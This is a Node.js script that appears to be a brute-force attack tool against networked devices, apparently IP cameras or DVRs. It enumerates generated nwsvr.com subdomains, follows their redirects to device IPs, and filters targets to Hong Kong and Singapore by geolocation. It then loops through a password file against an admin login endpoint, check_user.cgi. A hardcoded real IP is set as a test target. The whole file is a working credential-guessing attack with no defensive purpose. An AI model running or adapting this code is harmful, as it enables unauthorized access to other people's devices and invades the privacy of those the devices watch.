var request = require('request');
var winston = require('winston');
var sleep = require('sleep');
var satelize = require('satelize');
var readline = require('readline');
var fs = require('fs');
var util = require('util');
var stream = require('stream');
var es = require('event-stream');

var logger = new (winston.Logger)({
  transports: [
  	new (winston.transports.Console)(),
    new (winston.transports.File)({
      name: 'info',
      filename: './log/device.info.log',
      level: 'info'
    }),
    new (winston.transports.File)({
      name: 'error',
      filename: './log/device.error.log',
    })
  ]
});

var pwArray = [];

var s = fs.createReadStream('./passwords.txt')
	.pipe(es.split())
	.pipe(es.mapSync(function(line){
		s.pause();
		pwArray.push(line);
		s.resume();
	})
	.on('error', function(){
		console.log('Read file error');
	})
	.on('end', function(){
		console.log('Read file end, start spider');
		//startSpider();
		login('test','http://61.238.40.187');
	})
);


function startSpider() {
	for(a=116 ; a<117 ; a++) {
		for(b=97 ; b<123 ; b++) {
			for(c=97 ; c<123 ; c++) {
				for(d=97 ; d<123 ; d++) {
					var url = 'http://002' + String.fromCharCode(a,b,c,d) + '.nwsvr.com';
					getLink(url);
					sleep.usleep(500);
				}
			}
		}
	}
}

//url = 'http://002mhew.nwsvr.com';
//getLink(url);
function getLink(url) {
	request({url: url, followRedirect : false}, function (error, response, body) {
		
		if (!error && response.statusCode == 302) {		
			//console.log('Get url : ' + response.headers['location']);
            checkCountry(url,response.headers['location']);
			//login(url,response.headers['location']);
		}
	});
}

//Check country
function checkCountry(url,link) {
    var ip = link.substr(7);
    if(ip.indexOf(':')) {
        ip = ip.substr(0,ip.indexOf(':'));
    }
    try {
    satelize.satelize({ip:ip}, function(err, payload) {
        try{
            if((payload.country_code == 'HK') || (payload.country_code == 'SG')) {
			    login(url,link); 
            }   
        }
        catch(err) {}
    });
    }
    catch(err) {}
}

function login(url,link) {
	finish = false;
	pwInd = 0;
	do {
		pw = pwArray[pwInd];
		tmpLink = 'http://admin:'+pw+'@' + link.substr(7) + '/check_user.cgi';
		console.log(tmpLink);
		function login2(url2,link2,pw2) {
			request({url: link2}, function (error, response, body) {
				if (!error && response.statusCode == 200) {
					console.log(url2 + " pw : " + pw2);
					finish = true;
				} else if(!error && response.statusCode == 401) {
					console.log(url2 + " incorrect pw : " + pw2);
				} else {
					console.log(error);
					if(error.indexOf("Invalid URL") == -1) {
						finish = true;
					}
				}		
			});
		}		
		try {
		login2(url,tmpLink,pw);
		} catch(e) {}

		sleep.usleep(10000);	
		pwInd++;
	} while((!finish) && (pwInd < pwArray.length))
}

